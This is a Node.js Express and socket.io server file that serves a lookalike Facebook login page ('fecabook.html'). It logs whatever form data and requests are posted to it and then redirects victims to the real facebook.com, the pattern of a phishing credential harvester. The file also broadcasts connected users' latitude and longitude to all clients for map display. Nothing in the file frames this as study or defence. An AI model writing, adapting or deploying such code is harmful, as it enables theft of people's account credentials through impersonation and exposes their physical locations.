const { query } = require('express');
const express = require('express');
const app = express();

const server = require('http').createServer(app);

const io = require('socket.io').listen(server);
const bodyParser = require('body-parser');
users = [];
connections = [];

server.listen(process.env.Port || 5000)
console.log('server running...');

/*
server.listen(5000,function(){
    console.log('server running...');
});
*/
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res, next) => {
    console.log('Login fecabook');
    res.sendFile(__dirname + '/fecabook.html')
});

app.post('/fecaboook', (req, res, next) => {
    console.log('redirect to facebook with POST method');
    console.log(JSON.stringify(req.body));
    console.log(req);

    res.sendFile(__dirname + '/faceboook.html');
    //res.redirect('http://www.facebook.com');
});

app.get('/fecaboook', (req, res, next) => {
    console.log('redirect to facebook with GET method');
    console.log(JSON.stringify(req.query));
    console.log(req);
    
    res.redirect('http://www.facebook.com');
});

app.get('/faceboooooook', (req, res, next) => {
    console.log('opening client page');
    res.sendFile(__dirname + '/faceboooooook.html')
});

app.get('/client', (req, res, next) => {
    console.log('opening client page');
    res.sendFile(__dirname + '/client.html')
});

app.get('/map_me', (req, res, next) => {
    console.log('opening map_me page');
    res.sendFile(__dirname + './map_me.html')
});

app.get('/map_all', (req, res, next) => {
    console.log('opening map_all page');
    res.sendFile(__dirname + '//map_all.html')
});

io.sockets.on('connection', (socket) => {
    connections.push(socket);
    console.log('connect : %s sockets connected', connections.length);

    socket.on('disconnect', function (data) {

        users.splice(users.indexOf(socket.username), 1);
        updateUsernames();
        connections.splice(connections.indexOf(socket), 1);
        console.log('disconnect :remaining %s sockets connected', connections.length);
    });

    socket.on('send message', function (data) {
        console.log({ msg: data, user: socket.username });
        io.sockets.emit('new message', { msg: data, user: socket.username });
    })

    socket.on('new location', function (data) {
        console.log('new location : ');
        console.log(data);
        io.sockets.emit('new map location', { msg: data, user: socket.username });
        var strcoords = 'Location : ' + data.userlat + ' and ' + data.userlong + ' find me!';
        //console.log(strcoords);
        data = strcoords;
        io.sockets.emit('show new location', { msg: data, user: socket.username });
    })

    socket.on('new user', function (data, callback) {
        callback(true);
        console.log('new user : ' + data);
        socket.username = data;
        users.push(socket.username);
        updateUsernames();
    });

    socket.on('locationError', function (data) {
        console.log(`location Error : ${data.err}`);
        console.log(data);
    });

    function updateUsernames() {
        io.sockets.emit('get users', users);

    };
});
